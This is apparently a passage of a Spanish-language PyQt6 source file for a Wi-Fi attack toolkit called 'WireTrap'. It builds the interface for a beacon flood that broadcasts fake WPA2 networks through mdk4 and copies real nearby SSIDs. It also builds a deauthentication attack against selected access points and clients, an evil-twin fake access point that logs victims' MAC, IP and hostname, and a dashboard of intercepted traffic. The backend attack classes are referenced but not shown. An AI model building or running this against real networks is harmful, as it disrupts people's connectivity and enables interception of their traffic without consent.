        title.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        title.setStyleSheet("color: #5588ff;")
        header.addWidget(title)
        header.addStretch()

        self.flood_iface_label = QLabel("Interfaz Monitor:")
        self.flood_iface_combo = QComboBox()
        self.flood_iface_combo.setFixedWidth(140)
        header.addWidget(self.flood_iface_label)
        header.addWidget(self.flood_iface_combo)
        header.addSpacing(16)

        self.flood_status_label = QLabel("● IDLE")
        self.flood_status_label.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.flood_status_label.setStyleSheet("color: gray; font-weight: bold;")
        header.addWidget(self.flood_status_label)

        layout.addLayout(header)

        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setStyleSheet("color: #444;")
        layout.addWidget(line)

        # Panel central: opciones + log + stats
        center = QHBoxLayout()

        # ── Opciones ──────────────────────────────────────────
        opts_group = QGroupBox("CONFIGURACIÓN")
        opts_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        opts_group.setFixedWidth(340)
        opts_layout = QVBoxLayout(opts_group)
        opts_layout.setSpacing(18)

        # Canal
        ch_row = QHBoxLayout()
        ch_label = QLabel("Canal fijo:")
        ch_label.setFont(QFont("Monospace", 10))
        self.flood_channel_combo = QComboBox()
        self.flood_channel_combo.addItems([str(i) for i in range(1, 15)])
        self.flood_channel_combo.setCurrentText("6")
        self.flood_channel_combo.setFixedWidth(70)
        ch_row.addWidget(ch_label)
        ch_row.addStretch()
        ch_row.addWidget(self.flood_channel_combo)
        opts_layout.addLayout(ch_row)

        # Rotar canales
        self.flood_chk_rotate = QCheckBox(" Rotar canales (1 / 6 / 11)")
        self.flood_chk_rotate.setFont(QFont("Monospace", 10))
        self.flood_chk_rotate.setStyleSheet("color: #5588ff;")
        self.flood_chk_rotate.stateChanged.connect(
            lambda s: self.flood_channel_combo.setEnabled(s != 2)
        )
        opts_layout.addWidget(self.flood_chk_rotate)

        # Velocidad
        spd_label = QLabel("Velocidad (beacons/s):")
        spd_label.setFont(QFont("Monospace", 10))
        opts_layout.addWidget(spd_label)

        self.flood_speed_slider = QSlider(Qt.Orientation.Horizontal)
        self.flood_speed_slider.setMinimum(1)
        self.flood_speed_slider.setMaximum(5)
        self.flood_speed_slider.setValue(3)
        self.flood_speed_slider.setTickPosition(QSlider.TickPosition.TicksBelow)
        self.flood_speed_slider.setTickInterval(1)
        opts_layout.addWidget(self.flood_speed_slider)

        self.flood_speed_value = QLabel("200 pkt/s  (medio)")
        self.flood_speed_value.setFont(QFont("Monospace", 9))
        self.flood_speed_value.setStyleSheet("color: #aaaaaa;")
        opts_layout.addWidget(self.flood_speed_value)

        speed_map = {
            1: "50 pkt/s   (lento)",
            2: "100 pkt/s  (bajo)",
            3: "200 pkt/s  (medio)",
            4: "350 pkt/s  (rápido)",
            5: "500 pkt/s  (máximo)",
        }
        self.flood_speed_slider.valueChanged.connect(
            lambda v: self.flood_speed_value.setText(speed_map[v])
        )

        sep = QFrame()
        sep.setFrameShape(QFrame.Shape.HLine)
        sep.setStyleSheet("color: #333;")
        opts_layout.addWidget(sep)

        # Mezclar SSIDs reales
        self.flood_chk_real = QCheckBox(" Mezclar SSIDs reales\n (escanear primero)")
        self.flood_chk_real.setFont(QFont("Monospace", 10))
        self.flood_chk_real.setStyleSheet("color: #00ff88;")
        opts_layout.addWidget(self.flood_chk_real)

        # Botón escanear para capturar SSIDs reales
        self.btn_flood_scan = QPushButton("🔍 Escanear SSIDs del entorno")
        self.btn_flood_scan.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_flood_scan.setStyleSheet(
            "QPushButton { background: #1a2a4a; border: 1px solid #5588ff; color: #5588ff; padding: 6px; border-radius: 4px; }"
            "QPushButton:hover { background: #5588ff; color: white; }"
        )
        self.btn_flood_scan.clicked.connect(self._on_flood_scan_clicked)
        opts_layout.addWidget(self.btn_flood_scan)

        self.flood_real_ssids_label = QLabel("SSIDs capturados: 0")
        self.flood_real_ssids_label.setFont(QFont("Monospace", 9))
        self.flood_real_ssids_label.setStyleSheet("color: #aaaaaa;")
        opts_layout.addWidget(self.flood_real_ssids_label)

        opts_layout.addStretch()

        # Anunciar WPA2
        self.flood_chk_wpa2 = QCheckBox(" Anunciar como WPA2\n (aparece con 🔒)")
        self.flood_chk_wpa2.setFont(QFont("Monospace", 10))
        self.flood_chk_wpa2.setChecked(True)
        self.flood_chk_wpa2.setStyleSheet("color: #ffaa00;")
        opts_layout.addWidget(self.flood_chk_wpa2)

        center.addWidget(opts_group)

        # ── Panel derecho: stats + log ─────────────────────────
        right_layout = QVBoxLayout()

        # Stats
        stats_group = QGroupBox("ESTADÍSTICAS EN VIVO")
        stats_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        stats_layout = QHBoxLayout(stats_group)
        stats_layout.setSpacing(40)

        self.flood_lbl_count = QLabel("0")
        self.flood_lbl_count.setFont(QFont("Monospace", 36, QFont.Weight.Bold))
        self.flood_lbl_count.setStyleSheet("color: #5588ff;")
        self.flood_lbl_count.setAlignment(Qt.AlignmentFlag.AlignCenter)

        count_desc = QLabel("beacons\nenviados")
        count_desc.setFont(QFont("Monospace", 11))
        count_desc.setStyleSheet("color: #aaaaaa;")

        self.flood_lbl_ssids = QLabel("0")
        self.flood_lbl_ssids.setFont(QFont("Monospace", 36, QFont.Weight.Bold))
        self.flood_lbl_ssids.setStyleSheet("color: #00ff88;")
        self.flood_lbl_ssids.setAlignment(Qt.AlignmentFlag.AlignCenter)

        ssids_desc = QLabel("SSIDs\nreales mezclados")
        ssids_desc.setFont(QFont("Monospace", 11))
        ssids_desc.setStyleSheet("color: #aaaaaa;")

        stats_layout.addStretch()
        stats_layout.addWidget(self.flood_lbl_count)
        stats_layout.addWidget(count_desc)
        stats_layout.addSpacing(60)
        stats_layout.addWidget(self.flood_lbl_ssids)
        stats_layout.addWidget(ssids_desc)
        stats_layout.addStretch()

        stats_group.setFixedHeight(130)
        right_layout.addWidget(stats_group)

        # Log
        log_group = QGroupBox("LOG")
        log_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        log_layout_inner = QVBoxLayout(log_group)
        self.flood_log = QTextEdit()
        self.flood_log.setReadOnly(True)
        self.flood_log.setFont(QFont("Monospace", 9))
        self.flood_log.setStyleSheet("background: #0d0d1a; color: #5588ff; border: 1px solid #333;")
        self.flood_log.setPlaceholderText("Los eventos aparecerán aquí...")
        log_layout_inner.addWidget(self.flood_log)
        right_layout.addWidget(log_group)

        center.addLayout(right_layout)
        layout.addLayout(center, 1)

        # Botones
        btn_row = QHBoxLayout()
        self.btn_flood_start = QPushButton("📡  Iniciar Beacon Flood")
        self.btn_flood_start.setFixedHeight(44)
        self.btn_flood_start.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        self.btn_flood_start.setStyleSheet(
            "QPushButton { background: #111133; border: 2px solid #5588ff; color: #5588ff; border-radius: 4px; }"
            "QPushButton:hover { background: #5588ff; color: white; }"
        )
        self.btn_flood_start.clicked.connect(self._on_flood_start_clicked)

        self.btn_flood_stop = QPushButton("■  Detener")
        self.btn_flood_stop.setFixedHeight(44)
        self.btn_flood_stop.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        self.btn_flood_stop.setEnabled(False)
        self.btn_flood_stop.clicked.connect(self._on_flood_stop_clicked)

        btn_row.addWidget(self.btn_flood_start)
        btn_row.addWidget(self.btn_flood_stop)
        layout.addLayout(btn_row)

    # ── Flood: callbacks y slots ──────────────────────────────

    def _flood_log(self, msg):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        self.flood_log.append(f"[{ts}] {msg}")

    def _on_flood_scan_clicked(self):
        """Escaneo rápido de 8 s para capturar SSIDs reales del entorno."""
        iface = self.flood_iface_combo.currentText()
        if not iface:
            QMessageBox.warning(self, "Error", "Selecciona una interfaz.")
            return

        self.btn_flood_scan.setEnabled(False)
        self.btn_flood_scan.setText("🔍 Escaneando... (8s)")
        self._flood_log(f"Escaneando SSIDs reales en {iface}...")
        self._flood_captured_ssids = []

        flood_scanner = Scanner(iface)

        def on_ap(ap):
            if ap.ssid and ap.ssid not in self._flood_captured_ssids:
                self._flood_captured_ssids.append(ap.ssid)
                self.flood_real_ssids_label.setText(
                    f"SSIDs capturados: {len(self._flood_captured_ssids)}"
                )
                self.flood_lbl_ssids.setText(str(len(self._flood_captured_ssids)))

        flood_scanner.on_ap_found = on_ap
        flood_scanner.start()

        def stop_scan():
            flood_scanner.stop()
            self._flood_log(
                f"Escaneo completado: {len(self._flood_captured_ssids)} SSIDs capturados"
            )
            self.btn_flood_scan.setEnabled(True)
            self.btn_flood_scan.setText("🔍 Escanear SSIDs del entorno")

        QTimer.singleShot(8000, stop_scan)

    def _on_flood_start_clicked(self):
        iface = self.flood_iface_combo.currentText()
        if not iface:
            QMessageBox.warning(self, "Error", "Selecciona una interfaz monitor.")
            return

        # Velocidad: el slider ahora mapea a paquetes/segundo para mdk4
        pps_map = {
            1: 50,
            2: 100,
            3: 200,
            4: 350,
            5: 500,
        }
        pps = pps_map[self.flood_speed_slider.value()]
        channel = int(self.flood_channel_combo.currentText())
        rotate = self.flood_chk_rotate.isChecked()
        wpa2 = self.flood_chk_wpa2.isChecked()

        self.flooder = BeaconFlooder(iface)
        self.flooder.on_beacon_sent = lambda c: self.bridge.flood_beacon_sent.emit(c)
        self.flooder.on_stopped = lambda: self.bridge.flood_stopped.emit()
        if hasattr(self.flooder, 'on_error'):
            self.flooder.on_error = lambda msg: self._flood_log(f"[!] {msg}")

        self.flooder.start(
            channel=channel,
            pps=pps,
            rotate_channels=rotate,
            announce_wpa2=wpa2
        )

        self._flood_log(f"Beacon Flood iniciado en {iface} (backend: mdk4)")
        self._flood_log(f"  Canal: {'rotando (hop)' if rotate else channel}")
        self._flood_log(f"  Velocidad: {pps} paquetes/s")
        self._flood_log(f"  WPA2 falso: {'sí' if wpa2 else 'no'}")

        self.flood_status_label.setText("● FLOODING")
        self.flood_status_label.setStyleSheet("color: #5588ff; font-weight: bold;")
        self.btn_flood_start.setEnabled(False)
        self.btn_flood_stop.setEnabled(True)
        self.btn_flood_scan.setEnabled(False)

    def _on_flood_stop_clicked(self):
        if self.flooder:
            self.flooder.stop()

    def _on_flood_beacon_sent(self, count):
        self.flood_lbl_count.setText(f"{count:,}".replace(",", "."))

    def _on_flood_stopped(self):
        self._flood_log("Beacon Flood detenido.")
        self.flood_status_label.setText("● IDLE")
        self.flood_status_label.setStyleSheet("color: gray; font-weight: bold;")
        self.btn_flood_start.setEnabled(True)
        self.btn_flood_stop.setEnabled(False)
        self.btn_flood_scan.setEnabled(True)

    def _setup_deauth_ui(self, parent_widget):
        main_layout = QVBoxLayout(parent_widget)
        main_layout.setSpacing(8)
        main_layout.setContentsMargins(10, 10, 10, 10)

        # Header (barra compacta, no debe competir con las tablas)
        header = QHBoxLayout()

        self.btn_back = QPushButton("⬅ Volver al Menú")
        self.btn_back.setFixedWidth(150)
        self.btn_back.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_back.clicked.connect(lambda: self.stack.setCurrentIndex(0))
        header.addWidget(self.btn_back)
        header.addSpacing(20)

        title = QLabel("🔴 WireTrap: Deauth + Evil Twin")
        title.setFont(QFont("Monospace", 12, QFont.Weight.Bold))

        self.iface_label  = QLabel("Monitor:")
        self.iface_combo  = QComboBox()
        self.iface_combo.setFixedWidth(120)

        self.iface2_label = QLabel("AP:")
        self.iface2_combo = QComboBox()
        self.iface2_combo.setFixedWidth(120)

        self.out_label    = QLabel("Internet:")
        self.out_combo    = QComboBox()
        self.out_combo.setFixedWidth(90)

        self.status_label = QLabel("● IDLE")
        self.status_label.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.status_label.setStyleSheet(
            "color: gray; font-weight: bold;"
        )

        header.addWidget(title)
        header.addStretch()
        header.addWidget(self.iface_label)
        header.addWidget(self.iface_combo)
        header.addSpacing(8)
        header.addWidget(self.iface2_label)
        header.addWidget(self.iface2_combo)
        header.addSpacing(8)
        header.addWidget(self.out_label)
        header.addWidget(self.out_combo)
        header.addSpacing(16)
        header.addWidget(self.status_label)
        main_layout.addLayout(header)

        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setStyleSheet("color: #444;")
        main_layout.addWidget(line)

        # ── Tablas: panel PRINCIPAL, se lleva casi todo el espacio ──
        splitter = QSplitter(Qt.Orientation.Horizontal)

        table_font = QFont("Monospace", 11)
        header_font = QFont("Monospace", 11, QFont.Weight.Bold)

        ap_group  = QGroupBox("APs DETECTADOS")
        ap_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        ap_layout = QVBoxLayout(ap_group)
        self.ap_table = QTableWidget()
        self.ap_table.setColumnCount(6)
        self.ap_table.setHorizontalHeaderLabels(
            ["SSID", "BSSID", "Canal", "Seguridad", "Señal", "Clientes"]
        )
        self.ap_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.ap_table.horizontalHeader().setFont(header_font)
        self.ap_table.horizontalHeader().setMinimumHeight(34)
        self.ap_table.verticalHeader().setVisible(False)
        self.ap_table.verticalHeader().setDefaultSectionSize(32)
        self.ap_table.setFont(table_font)
        self.ap_table.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows
        )
        self.ap_table.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers
        )
        self.ap_table.setAlternatingRowColors(True)
        self.ap_table.itemClicked.connect(self._on_ap_selected)
        ap_layout.addWidget(self.ap_table)
        splitter.addWidget(ap_group)

        client_group  = QGroupBox("CLIENTES ASOCIADOS")
        client_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        client_layout = QVBoxLayout(client_group)
        self.client_table = QTableWidget()
        self.client_table.setColumnCount(4)
        self.client_table.setHorizontalHeaderLabels(
            ["MAC", "Fabricante", "Señal", "AP"]
        )
        self.client_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.client_table.horizontalHeader().setFont(header_font)
        self.client_table.horizontalHeader().setMinimumHeight(34)
        self.client_table.verticalHeader().setVisible(False)
        self.client_table.verticalHeader().setDefaultSectionSize(32)
        self.client_table.setFont(table_font)
        self.client_table.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows
        )
        self.client_table.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers
        )
        self.client_table.setAlternatingRowColors(True)
        self.client_table.itemClicked.connect(self._on_client_selected)
        client_layout.addWidget(self.client_table)
        splitter.addWidget(client_group)

        # ── Panel Evil Twin: igual estilo que los otros dos ───────
        self.et_group = QGroupBox("EVIL TWIN -- CLIENTES CAPTURADOS")
        self.et_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        et_layout = QVBoxLayout(self.et_group)
        self.et_table = QTableWidget()
        self.et_table.setColumnCount(5)
        self.et_table.setHorizontalHeaderLabels(
            ["Hora", "MAC", "IP", "Hostname", "Fabricante"]
        )
        self.et_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.et_table.horizontalHeader().setFont(header_font)
        self.et_table.horizontalHeader().setMinimumHeight(34)
        self.et_table.verticalHeader().setVisible(False)
        self.et_table.verticalHeader().setDefaultSectionSize(32)
        self.et_table.setFont(table_font)
        self.et_table.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows
        )
        self.et_table.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers
        )
        self.et_table.setAlternatingRowColors(True)
        self.et_table.cellDoubleClicked.connect(self._on_et_table_double_click)
        et_layout.addWidget(self.et_table)

        self.btn_global_dashboard = QPushButton("▶ Dashboard Global de Interceptación")
        self.btn_global_dashboard.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_global_dashboard.setStyleSheet(
            "QPushButton { background: #00aa44; color: black; padding: 6px; border-radius: 4px; }"
            "QPushButton:hover { background: #00ff88; }"
        )
        self.btn_global_dashboard.clicked.connect(lambda: self._open_client_dashboard(None))
        et_layout.addWidget(self.btn_global_dashboard)

        self.et_group.setVisible(False)  # HIDDEN BY DEFAULT
        splitter.addWidget(self.et_group)

        splitter.setSizes([700, 600, 700])
        main_layout.addWidget(splitter, 6)

        # ── Panel de ataque: secundario, compacto ────────────────
        attack_group  = QGroupBox("ESTADO DEL ATAQUE")
        attack_layout = QHBoxLayout(attack_group)

        self.attack_info = QLabel(
            "Objetivo AP:     —\n"
            "Objetivo Cliente: —\n"
            "Técnica:         —\n"
            "Estado:          IDLE"
        )
        self.attack_info.setFont(QFont("Monospace", 10))
        self.attack_info.setMinimumWidth(320)

        # Checkbox para Evil Twin
        self.chk_eviltwin = QCheckBox(" Habilitar AP Falso")
        self.chk_eviltwin.setFont(QFont("Monospace", 14, QFont.Weight.Bold))
        self.chk_eviltwin.setStyleSheet(
            "QCheckBox { color: #00ff88; }"
            "QCheckBox::indicator { width: 24px; height: 24px; border: 2px solid #00aa44; border-radius: 4px; background: #0a1f0a; }"
            "QCheckBox::indicator:checked { background: #00ff88; border: 2px solid #00ff88; }"
        )
        self.chk_eviltwin.stateChanged.connect(self._on_et_checkbox_changed)

        self.wpa_passphrase = ""

        pass_layout = QVBoxLayout()
        pass_layout.addStretch()
        pass_layout.addWidget(self.chk_eviltwin, alignment=Qt.AlignmentFlag.AlignCenter)
        pass_layout.addStretch()

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setMaximumHeight(110)
        self.log_output.setFont(QFont("Monospace", 9))
        self.log_output.setPlaceholderText(
            "Los eventos aparecerán aquí..."
        )

        attack_layout.addWidget(self.attack_info)
        attack_layout.addLayout(pass_layout)
        attack_layout.addWidget(self.log_output)
        attack_group.setMaximumHeight(170)
        main_layout.addWidget(attack_group, 1)

        # Botones
        btn_layout = QHBoxLayout()

        self.btn_scan   = QPushButton("▶  Iniciar Escaneo")
        self.btn_attack = QPushButton("⚡  Iniciar Ataque")
        self.btn_stop   = QPushButton("■  Detener Todo")

        self.btn_attack.setEnabled(False)
        self.btn_stop.setEnabled(False)

        self.btn_scan.clicked.connect(self._on_scan_clicked)
        self.btn_attack.clicked.connect(self._on_attack_clicked)
        self.btn_stop.clicked.connect(self._on_stop_clicked)

        for btn in [self.btn_scan, self.btn_attack, self.btn_stop]:
            btn.setFixedHeight(42)
            btn.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
            btn_layout.addWidget(btn)

        main_layout.addLayout(btn_layout)

    def _on_et_checkbox_changed(self, state):
        is_checked = (state == 2)
        if is_checked:
            from PyQt6.QtWidgets import QDialog, QVBoxLayout, QLabel, QLineEdit, QPushButton, QHBoxLayout
            from PyQt6.QtCore import Qt
            from PyQt6.QtGui import QFont

            dialog = QDialog(self)
            dialog.setWindowTitle("Contraseña Evil Twin")
            dialog.setFixedSize(450, 220)
            dialog.setStyleSheet(
                "QDialog { background: #0a1f0a; border: 2px solid #00aa44; border-radius: 8px; }"
                "QLabel { color: #00ff88; font-weight: bold; font-family: Monospace; font-size: 11pt; }"
                "QLineEdit { background: #0d2b0d; color: #00ff88; border: 1px solid #00ff88; padding: 8px; font-family: Monospace; font-size: 12pt; border-radius: 4px; }"
                "QPushButton { background: #00aa44; color: black; font-weight: bold; border-radius: 4px; padding: 8px; font-family: Monospace; font-size: 11pt; }"
                "QPushButton:hover { background: #00ff88; }"
            )
            layout = QVBoxLayout(dialog)

            lbl = QLabel("Introduce la contraseña para el Evil Twin:\n(Déjalo vacío para crear una red Abierta/OPEN)\n(WPA2 requiere mínimo 8 caracteres)")
            lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            layout.addWidget(lbl)
            layout.addSpacing(10)

            inp = QLineEdit()
            inp.setPlaceholderText("Ej: contrasena123")
            layout.addWidget(inp)
            layout.addSpacing(15)

            warn_lbl = QLabel("")
            warn_lbl.setStyleSheet("color: #ff4444; font-size: 9pt;")
            warn_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            layout.addWidget(warn_lbl)

            btn_layout = QHBoxLayout()
            btn_ok = QPushButton("Aceptar")
            btn_cancel = QPushButton("Cancelar")
            btn_cancel.setStyleSheet("background: #555555; color: white;")
            btn_cancel.clicked.connect(dialog.reject)

            def on_accept():
                pwd = inp.text().strip()
                if pwd and len(pwd) < 8:
                    warn_lbl.setText("⚠ WPA2 exige mínimo 8 caracteres")
                    return
                dialog.accept()

            btn_ok.clicked.connect(on_accept)
            btn_layout.addWidget(btn_cancel)
            btn_layout.addWidget(btn_ok)
            layout.addLayout(btn_layout)

            if dialog.exec():
                self.wpa_passphrase = inp.text().strip()
                self.et_group.setVisible(True)
            else:
                self.chk_eviltwin.blockSignals(True)
                self.chk_eviltwin.setChecked(False)
                self.chk_eviltwin.blockSignals(False)
                self.et_group.setVisible(False)
        else:
            self.et_group.setVisible(False)
            self.wpa_passphrase = ""

    def apply_styles(self):
        self.setStyleSheet("""
            QMainWindow, QWidget {
                background-color: #1a1a2e;
                color: #e0e0e0;
            }
            QGroupBox {
                border: 1px solid #444;
                border-radius: 4px;
                margin-top: 8px;
                padding-top: 10px;
                font-weight: bold;
                color: #00ff88;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 4px;
            }
            QTableWidget {
                background-color: #16213e;
                alternate-background-color: #1b2a4a;
                gridline-color: #333;
                border: none;
            }
            QTableWidget::item {
                padding: 4px;
            }
            QHeaderView::section {
                background-color: #0f3460;
                color: #00ff88;
                padding: 6px;
                border: none;
                font-weight: bold;
            }
            QTableWidget::item:selected {
                background-color: #e94560;
                color: white;
            }
            QPushButton {
                background-color: #0f3460;
                color: #e0e0e0;
                border: 1px solid #444;
                border-radius: 4px;
                font-weight: bold;
                padding: 4px 12px;
            }
            QPushButton:hover {
                background-color: #e94560;
                color: white;
            }
            QPushButton:disabled {
                background-color: #222;
                color: #555;
            }
            QComboBox {
                background-color: #16213e;
                color: #e0e0e0;
                border: 1px solid #444;
                padding: 2px;
            }
            QTextEdit {
                background-color: #0d0d1a;
                color: #00ff88;
                border: 1px solid #333;
            }
            QLabel {
                color: #e0e0e0;
            }
            QSlider::groove:horizontal {
                height: 6px;
                background: #333;
                border-radius: 3px;
            }
            QSlider::handle:horizontal {
                background: #5588ff;
                width: 16px;
                height: 16px;
                margin: -5px 0;
                border-radius: 8px;
            }
            QSlider::sub-page:horizontal {
                background: #5588ff;
                border-radius: 3px;
            }
        """)

    # ── Interfaces ────────────────────────────────────────────

    def _populate_interfaces(self):
        import subprocess
        result = subprocess.run(
            ["ip", "link", "show"],
            capture_output=True, text=True
        )
        interfaces = []
        for line in result.stdout.split("\n"):
            if ": " in line and "lo" not in line:
                iface = line.split(": ")[1].split(":")[0].strip()
                if iface:
                    interfaces.append(iface)

        self.iface_combo.addItems(interfaces)
        self.iface2_combo.addItems(interfaces)
        self.out_combo.addItems(interfaces)
        self.flood_iface_combo.addItems(interfaces)
        if hasattr(self, 'wpa2_iface_combo'):
            self.wpa2_iface_combo.addItems(interfaces)
        if hasattr(self, 'cp_iface_combo'):
            self.cp_iface_combo.addItems(interfaces)

        for i, iface in enumerate(interfaces):
            if "wlan0" in iface:
                self.iface_combo.setCurrentIndex(i)
                self.flood_iface_combo.setCurrentIndex(i)
                if hasattr(self, 'wpa2_iface_combo'):
                    self.wpa2_iface_combo.setCurrentIndex(i)
                if hasattr(self, 'cp_iface_combo'):
                    self.cp_iface_combo.setCurrentIndex(i)
            if "wlan1" in iface:
                self.iface2_combo.setCurrentIndex(i)
            if "eth0" in iface:
                self.out_combo.setCurrentIndex(i)

    # ── Slots de tablas ───────────────────────────────────────

    def _on_ap_selected(self):
        row = self.ap_table.currentRow()
        if row < 0:
            return
        bssid = self.ap_table.item(row, 1).text()
        if self.scanner and bssid in self.scanner.aps:
            self.selected_ap = self.scanner.aps[bssid]
            self.attack_plan = self.engine.analyze(self.selected_ap)
            self.client_table.setRowCount(0)
            clients = self.scanner.get_clients_for_ap(bssid)
            for client in clients:
                self._add_client_row(client)
            self._update_attack_info()
            self.btn_attack.setEnabled(True)
            self.log(f"AP seleccionado: {self.selected_ap.ssid} "
                     f"→ Técnica: {self.attack_plan.technique}")
            if getattr(self.selected_ap, "pmf_required", False):
                self.log("⚠ PMF obligatorio (802.11w MFPR) en este AP: "
                          "el deauth clásico no funcionará.")
            elif getattr(self.selected_ap, "pmf_capable", False):
                self.log("⚠ PMF opcional (802.11w MFPC) en este AP: "
                          "el deauth puede fallar contra clientes modernos.")
            if self.scanner and self.selected_ap.channel:
                self.scanner.fixed_channel = self.selected_ap.channel
                self.log(f"Canal fijado: {self.selected_ap.channel}")

    def _on_client_selected(self):
        row = self.client_table.currentRow()
        if row < 0:
            return
        mac = self.client_table.item(row, 0).text()
        if self.scanner and mac in self.scanner.clients:
            self.selected_client = self.scanner.clients[mac]
            self.log(f"Cliente seleccionado: {mac} "
                     f"({self.selected_client.vendor})")
            self._update_attack_info()

    def _update_attack_info(self):
        ap_str     = (self.selected_ap.ssid if self.selected_ap else "—")
        client_str = (self.selected_client.mac
                      if self.selected_client else "Todos los clientes")
        tech_str   = (self.attack_plan.technique if self.attack_plan else "—")
        risk_str   = (self.attack_plan.risk_level if self.attack_plan else "—")
        estado     = "ATACANDO" if self.attacking else "IDLE"

        self.attack_info.setText(
            f"Objetivo AP:      {ap_str}\n"
            f"Objetivo Cliente: {client_str}\n"
            f"Técnica:          {tech_str}\n"
            f"Riesgo:           {risk_str}\n"
            f"Estado:           {estado}"
        )

    # ── Callbacks del scanner ─────────────────────────────────

    def _on_ap_found(self, ap: AccessPoint):
        self._insert_ap_into_table(self.ap_table, ap)
        if hasattr(self, 'wpa2_ap_table'):
            self._insert_ap_into_table(self.wpa2_ap_table, ap)

    def _insert_ap_into_table(self, table, ap: AccessPoint):
        if not table: return
        row = table.rowCount()
        table.insertRow(row)

        values = [
            ap.ssid, ap.bssid, str(ap.channel),
            ap.security, f"{ap.signal} dBm", str(len(ap.clients))
        ]

        for col, val in enumerate(values):
            item = QTableWidgetItem(val)
            item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)

            if col == 3:
                colors = {
                    "OPEN": "#ff4444", "WEP": "#ff6600",
                    "WPA": "#ffaa00", "WPA2": "#ffcc00",
                    "WPA2/WPA3": "#88ff00", "WPA3": "#00ff88",
                }
                item.setForeground(QColor(colors.get(val, "#e0e0e0")))

            table.setItem(row, col, item)

    def _on_client_found(self, client: Client):
        if self.selected_ap and client.bssid == self.selected_ap.bssid:
            self._add_client_row(client)

        def _update_count(table):
            if not getattr(self, table, None): return
            t = getattr(self, table)
            for row in range(t.rowCount()):
                bssid_item = t.item(row, 1)
                if bssid_item and bssid_item.text() == client.bssid:
                    ap = self.scanner.aps.get(client.bssid)
                    if ap:
                        count_item = QTableWidgetItem(str(len(ap.clients)))
                        count_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                        t.setItem(row, 5, count_item)
                    break

        _update_count('ap_table')
        _update_count('wpa2_ap_table')

    def _add_client_row(self, client: Client):
        row = self.client_table.rowCount()
        self.client_table.insertRow(row)
        values = [client.mac, client.vendor, f"{client.signal} dBm", client.bssid]
        for col, val in enumerate(values):
            item = QTableWidgetItem(val)
            item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.client_table.setItem(row, col, item)

    def _refresh_ap_table(self):
        if not self.scanner:
            return

        def _update_table(table):
            for row in range(table.rowCount()):
                bssid_item = table.item(row, 1)
                if not bssid_item:
                    continue
                ap = self.scanner.aps.get(bssid_item.text())
                if not ap:
                    continue
                signal_item = table.item(row, 4)
                if signal_item:
                    signal_item.setText(f"{ap.signal} dBm")
                count_item = table.item(row, 5)
                if count_item:
                    count_item.setText(str(len(ap.clients)))

        _update_table(self.ap_table)
        if hasattr(self, 'wpa2_ap_table'):
            _update_table(self.wpa2_ap_table)

    def _on_client_joined(self, info: str):
        import re
        from datetime import datetime
        self.log(f"[+] Cliente en Evil Twin: {info}")
        match = re.search(
            r'DHCPACK\(\S+\)\s+(\d+\.\d+\.\d+\.\d+)\s+'
            r'([0-9a-fA-F:]{17})(?:\s+(\S+))?',
            info
        )
        if match:
            ip       = match.group(1)
            mac      = match.group(2).lower()
            hostname = match.group(3) or "--"
            hora     = datetime.now().strftime("%H:%M:%S")
            self.bridge.et_client_detail.emit(mac, ip, hostname, hora)

    def _on_et_client_detail(self, mac, ip, hostname, hora):
        from utils.oui_lookup import get_vendor
        vendor = get_vendor(mac)
        row = self.et_table.rowCount()
        self.et_table.insertRow(row)
        for col, val in enumerate([hora, mac, ip, hostname, vendor]):
            item = QTableWidgetItem(val)
            item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            item.setForeground(QColor("#e94560"))
            self.et_table.setItem(row, col, item)
        self.et_group.setStyleSheet(
            "QGroupBox { border: 2px solid #e94560; color: #e94560; "
            "border-radius: 4px; margin-top: 8px; padding-top: 10px; }"
        )

    def _open_client_dashboard(self, mac=None):
        initial = self.sniffer.captured if self.sniffer else []
        dash = DashboardDialog(mac, self)
        for d in initial:
            dash.on_data_captured(d)
        self.dashboards.append(dash)
        dash.show()

    def _on_et_table_double_click(self, row, column):
        mac_item = self.et_table.item(row, 1)
        if mac_item:
            self._open_client_dashboard(mac_item.text())

    def _on_data_captured(self, data):
        self.log(f"[!] Tráfico interceptado: {data.data_type} ({data.source_ip})")
        self.dashboards = [d for d in self.dashboards if d.isVisible()]
        for dash in self.dashboards:
            dash.on_data_captured(data)

    def _on_attack_stopped(self):
        self.attacking = False
        self._update_attack_info()
        self.log("[!] Ataque detenido.")
        self.status_label.setText("● IDLE")
        self.status_label.setStyleSheet("color: gray; font-weight: bold;")
        self.et_group.setStyleSheet("")
        self.btn_stop.setEnabled(False)
